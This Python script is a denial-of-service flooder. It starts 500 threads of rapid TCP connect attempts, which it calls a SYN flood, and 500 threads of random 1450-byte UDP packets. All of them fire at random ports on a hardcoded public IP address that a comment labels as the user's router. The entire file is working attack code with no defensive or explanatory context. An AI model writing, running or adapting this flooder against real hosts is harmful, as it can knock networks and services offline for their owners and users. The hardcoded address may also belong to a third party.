import socket
import threading
import random

router_ip = "62.109.121.43"  # ← YOUR ROUTER IP

def syn_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((router_ip, random.randint(1, 65535)))
            sock.close()
        except:
            pass

def udp_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random.randbytes(1450)  # Max UDP before fragmentation
            sock.sendto(data, (router_ip, random.randint(1, 65535)))
            sock.close()
        except:
            pass

# Start 500 SYN threads
for _ in range(500):
    threading.Thread(target=syn_flood, daemon=True).start()

# Start 500 UDP threads  
for _ in range(500):
    threading.Thread(target=udp_flood, daemon=True).start()

print("SYN+UDP Combo flooding...")
while True:
    pass
